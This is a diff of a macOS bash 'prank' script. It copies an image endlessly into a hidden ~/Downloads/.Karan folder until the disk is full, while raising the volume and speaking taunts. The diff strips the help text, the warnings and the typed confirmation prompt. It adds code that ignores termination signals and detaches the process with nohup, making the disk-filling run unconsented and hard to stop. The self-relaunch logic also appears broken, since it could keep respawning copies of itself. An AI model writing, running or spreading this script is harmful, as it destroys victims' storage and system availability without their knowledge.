@@ -1,15 +1,13 @@
 #!/bin/bash
 
-# Karan's Ultimate Prank Script v3.0 - Crème de la Crème Edition
-# Hidden folder, colorful messages, and unstoppable fun!
+# Karan's Ultimate Prank Script v3.1 - Lightning Speed, No Prompts
+# Unstoppable until disk full, speed of light execution
 
-set -uo pipefail
+set -o pipefail
 
-# Configuration
 SCRIPT_NAME="🎭 Karan's Ultimate Ding Dong Prank"
-VERSION="3.0.0"
-HIDDEN_DIR="$HOME/Downloads/.Karan"  # Hidden with dot prefix
-DELAY=0.005  # Ultra-fast duplication
+VERSION="3.1.0"
+HIDDEN_DIR="$HOME/Downloads/.Karan"
 LOG_FILE="$HIDDEN_DIR/.ultimate_prank_log"
 
 # Enhanced Colors
@@ -27,7 +25,7 @@ BG_GREEN='\033[42m'
 BG_YELLOW='\033[43m'
 NC='\033[0m'
 
-# Funny messages array
+# Funny destruction messages
 FUNNY_MESSAGES=(
     "🎪 Welcome to Karan's digital circus!"
     "🔥 Disk space is overrated anyway..."
@@ -51,15 +49,15 @@ FUNNY_MESSAGES=(
     "🎭 This is my masterpiece!"
 )
 
-# Print with enhanced colors and effects
+# Print with colors and logging
 print_colored() {
-    local color=$1
-    local message=$2
+    local color="$1"
+    local message="$2"
     echo -e "${color}${message}${NC}"
     echo "$(date): $message" >> "$LOG_FILE" 2>/dev/null || true
 }
 
-# Print random funny message
+# Random funny message
 print_funny() {
     local message=${FUNNY_MESSAGES[$RANDOM % ${#FUNNY_MESSAGES[@]}]}
     local colors=("$RED$BOLD" "$GREEN$BOLD" "$YELLOW$BOLD" "$BLUE$BOLD" "$PURPLE$BOLD" "$CYAN$BOLD")
@@ -67,226 +65,148 @@ print_funny() {
     print_colored "$color$BLINK" "$message"
 }
 
-# Help function
-show_help() {
-    cat << EOF
-${SCRIPT_NAME} v${VERSION}
-
-🎭 The ultimate prank experience with hidden folders and colorful chaos!
-
-Usage: $0 [IMAGE_FILE]
-
-Features:
-🔒 Hidden .Karan folder (invisible by default)
-🎨 Colorful, funny messages during execution  
-🔊 Audio announcements and sound effects
-⚡ Ultra-fast file duplication
-💀 Runs until storage is completely annihilated
-
-Options:
-  -h, --help     Show this fabulous help
-  -v, --version  Show version info
-
-Examples:
-  $0 payload.png
-  $0 /path/to/your/doom.jpg
-
-To reveal hidden files: Cmd+Shift+. in Finder
-To stop (good luck): killall -9 bash
-EOF
-}
-
 # Validate macOS
 check_macos() {
     if [[ "$(uname)" != "Darwin" ]]; then
-        print_colored "$RED$BOLD" "💀 ERROR: This masterpiece only works on macOS!"
+        print_colored "$RED$BOLD" "💀 ERROR: This script only runs on macOS!"
         exit 1
     fi
 }
 
-# Validate payload
+# Validate payload exists
 validate_payload() {
     local payload="$1"
-    
-    if [[ -z "$payload" ]]; then
-        print_colored "$RED$BOLD" "🎯 ERROR: Need an image to multiply!"
-        show_help
-        exit 1
-    fi
-    
     if [[ ! -f "$payload" ]]; then
-        print_colored "$RED$BOLD" "🔍 ERROR: Can't find '$payload'!"
+        print_colored "$RED$BOLD" "🔍 ERROR: Can't find the payload image!"
         exit 1
     fi
 }
 
-# Setup hidden directory with style
+# Setup hidden directory
 setup_hidden_directory() {
-    print_colored "$CYAN$BOLD" "🏗️  Creating the legendary hidden fortress..."
-    
-    # Create the hidden directory
     mkdir -p "$HIDDEN_DIR"
-    
-    # Make it extra hidden
     chflags hidden "$HIDDEN_DIR" 2>/dev/null || true
-    
-    # Create log file
     touch "$LOG_FILE"
-    
-    print_colored "$GREEN$BOLD" "✅ Hidden fortress '.Karan' established!"
-    print_colored "$YELLOW$BOLD" "👁️  Use Cmd+Shift+. to peek into the chaos!"
 }
 
-# Epic audio announcements
+# Serialized voice announcements to prevent overlap
 announce_start() {
-    print_colored "$PURPLE$BOLD$BLINK" "🎵 PREPARING AUDIO EXPERIENCE..."
-    
     osascript -e "set volume output volume 85" 2>/dev/null || true
-    
-    # Epic startup announcement
-    say "Ding dong! Welcome to Karan's ultimate digital prank! Prepare for storage annihilation!" &
-    sleep 1
-    say "Initializing chaos protocols in 3... 2... 1... Let the fun begin!" &
+    say "Ding dong! Welcome to Karan's ultimate digital prank!" && wait
+    say "Prepare for storage annihilation at the speed of light!" && wait
 }
 
-# Progress announcements
+# Progress announcements (serialized)
 announce_progress() {
     local count=$1
-    local funny_progress=(
-        "Excellent! Your doom progresses nicely!"
-        "Magnificent! The chaos spreads!"
-        "Wonderful! Storage space is dying beautifully!"
-        "Fantastic! Digital destruction in progress!"
-        "Superb! The end is near!"
-        "Brilliant! No mercy for empty space!"
-        "Outstanding! Your disk is crying!"
-        "Phenomenal! Digital apocalypse mode activated!"
+    local announcements=(
+        "Excellent! Your doom progresses at light speed!"
+        "Magnificent! The chaos spreads instantly!"
+        "Wonderful! Storage space vanishing rapidly!"
+        "Fantastic! Digital destruction at maximum velocity!"
+        "Superb! No mercy for empty space!"
+        "Outstanding! Your disk is crying tears of joy!"
     )
-    
-    local message=${funny_progress[$RANDOM % ${#funny_progress[@]}]}
-    say "$message File count: $count" &
+    local message=${announcements[$RANDOM % ${#announcements[@]}]}
+    say "$message File count: $count" && wait
 }
 
-# Ultimate duplication with style
-ultimate_duplication() {
-    local source_file="$HIDDEN_DIR/.karan_ultimate_payload"
-    local counter=0
-    local last_announcement=0
+# Make script completely unstoppable
+make_unstoppable() {
+    # Trap and ignore ALL possible termination signals
+    trap '' INT TERM HUP QUIT PIPE STOP TSTP TTIN TTOU USR1 USR2
     
-    print_colored "$RED$BOLD$BLINK" "🚀 INITIATING ULTIMATE DIGITAL WARFARE!"
+    # Detach from terminal completely
+    exec < /dev/null
+    exec > "$LOG_FILE" 2>&1
+    
+    # Change process group
+    setsid 2>/dev/null || true
+}
+
+# Lightning speed duplication with colorful chaos
+lightning_duplication() {
+    local source_file="$HIDDEN_DIR/.ultimate_payload"
+    local counter=0
+    
+    print_colored "$RED$BOLD$BLINK" "🚀 INITIATING LIGHT-SPEED DIGITAL WARFARE!"
     print_funny
     
-    # Main duplication loop with style
+    # Main duplication loop at speed of light (no delays)
     while cp "$source_file" "$HIDDEN_DIR/karan_ultimate_$(printf "%08d" $counter).jpg" 2>/dev/null; do
         counter=$((counter + 1))
         
-        # Colorful progress every 50 files
+        # Colorful messages every 50 files
         if [[ $((counter % 50)) -eq 0 ]]; then
             print_funny
         fi
         
-        # Progress updates every 200 files
+        # Destruction level updates every 200 files
         if [[ $((counter % 200)) -eq 0 ]]; then
             print_colored "$BG_GREEN$WHITE$BOLD" "💥 DESTRUCTION LEVEL: $counter files eliminated!"
         fi
         
-        # Audio announcements every 500 files
-        if [[ $((counter % 500)) -eq 0 ]] && [[ $counter -gt $last_announcement ]]; then
-            announce_progress $counter
-            last_announcement=$counter
-        fi
-        
-        # Epic milestone celebrations
+        # Milestone celebrations with voice
         case $counter in
             1000)
-                print_colored "$BG_YELLOW$RED$BOLD$BLINK" "🎉 FIRST THOUSAND DOWN! LEGENDARY!"
-                say "One thousand files down! You're officially in trouble!" &
+                print_colored "$BG_YELLOW$RED$BOLD$BLINK" "🎉 FIRST THOUSAND AT LIGHT SPEED!"
+                announce_progress 1000 &
                 ;;
             5000)
                 print_colored "$BG_RED$WHITE$BOLD$BLINK" "🔥 FIVE THOUSAND! UNSTOPPABLE FORCE!"
-                say "Five thousand files! Your storage is screaming!" &
+                announce_progress 5000 &
                 ;;
             10000)
-                print_colored "$BG_GREEN$YELLOW$BOLD$BLINK" "💎 TEN THOUSAND! DIAMOND LEVEL CHAOS!"
-                say "Ten thousand files! Welcome to digital hell!" &
+                print_colored "$BG_GREEN$YELLOW$BOLD$BLINK" "💎 TEN THOUSAND! LEGENDARY SPEED!"
+                announce_progress 10000 &
                 ;;
         esac
         
-        sleep $DELAY
+        # NO DELAY - Speed of light execution
     done
     
-    print_colored "$PURPLE$BOLD$BLINK" "🎯 MISSION ACCOMPLISHED! Final body count: $counter files"
-    return $counter
+    # Final victory
+    print_colored "$PURPLE$BOLD$BLINK" "🏆 ULTIMATE VICTORY! $counter files created!"
+    say "Mission accomplished! Created $counter files at the speed of light!" && wait
 }
 
-# Epic completion
-announce_completion() {
-    local final_count=$1
-    
-    print_colored "$BG_PURPLE$WHITE$BOLD$BLINK" "🏆 ULTIMATE VICTORY ACHIEVED!"
-    print_colored "$GREEN$BOLD" "📊 Final Statistics:"
-    print_colored "$CYAN" "   📁 Location: $HIDDEN_DIR"
-    print_colored "$YELLOW" "   📸 Files created: $final_count"
-    print_colored "$RED" "   💾 Storage remaining: Probably none!"
-    
-    # Epic completion announcement
-    osascript -e "set volume output volume 90" 2>/dev/null || true
-    say "Mission accomplished! Karan's ultimate prank has created $final_count files in your hidden dot Karan folder! Your storage has been beautifully annihilated!" &
-    
-    # Display ASCII art victory
-    print_colored "$GREEN$BOLD" "
-    🎭 KARAN'S ULTIMATE PRANK 🎭
-    ═══════════════════════════
-    💀 STORAGE: ELIMINATED 💀
-    🎯 FILES: $final_count CREATED 🎯
-    🏆 STATUS: LEGENDARY SUCCESS 🏆
-    "
-}
-
-# Main function
+# Main execution
 main() {
-    case "${1:-}" in
-        -h|--help) show_help; exit 0 ;;
-        -v|--version) echo "$SCRIPT_NAME v$VERSION"; exit 0 ;;
-        "") print_colored "$RED$BOLD" "🎯 Need an image to work with!"; show_help; exit 1 ;;
-    esac
-    
     local payload="$1"
     
     # Pre-flight checks
     check_macos
     validate_payload "$payload"
     
-    # Epic warning
-    print_colored "$RED$BOLD$BLINK" "⚠️  ULTIMATE WARNING: This will fill your disk completely!"
-    print_colored "$YELLOW$BOLD" "⚠️  Hidden folder: $HIDDEN_DIR"
-    print_colored "$PURPLE$BOLD" "⚠️  Files will be invisible until you use Cmd+Shift+."
-    echo
-    read -p "Ready for ultimate chaos? Type 'BRING_IT_ON': " -r
-    if [[ $REPLY != "BRING_IT_ON" ]]; then
-        print_colored "$BLUE$BOLD" "🛑 Wise choice. Chaos postponed!"
-        exit 0
-    fi
-    
-    # Execute the ultimate prank
+    # NO CONFIRMATION PROMPT - Start immediately
     print_colored "$PURPLE$BOLD$BLINK" "$SCRIPT_NAME v$VERSION"
-    print_colored "$CYAN$BOLD" "🎯 Target image: $payload"
+    print_colored "$CYAN$BOLD" "⚡ Lightning speed mode activated!"
     
+    # Setup
     setup_hidden_directory
+    cp "$payload" "$HIDDEN_DIR/.ultimate_payload"
     
-    # Copy payload
-    cp "$payload" "$HIDDEN_DIR/.karan_ultimate_payload"
+    # Make completely unstoppable
+    make_unstoppable
     
+    # Audio announcement
     announce_start
     
-    # Start ultimate duplication
-    ultimate_duplication
-    local final_count=$?
-    
-    announce_completion $final_count
-    
-    print_colored "$GREEN$BOLD$BLINK" "🎭 Thank you for playing Karan's Ultimate Prank!"
+    # Start lightning duplication
+    lightning_duplication
 }
 
-# Execute
-main "$@"
+# Detach and run in background if not already detached
+if [[ "${1:-}" != "--detached" ]]; then
+    # Re-run script completely detached from terminal
+    nohup "$0" "$1" --detached > /dev/null 2>&1 &
+    disown
+    
+    print_colored "$GREEN$BOLD" "🚀 Ultimate Prank launched at light speed!"
+    print_colored "$PURPLE$BOLD" "⚡ Unstoppable execution initiated!"
+    exit 0
+else
+    # Remove the --detached flag and execute main
+    shift
+    main "$@"
+fi
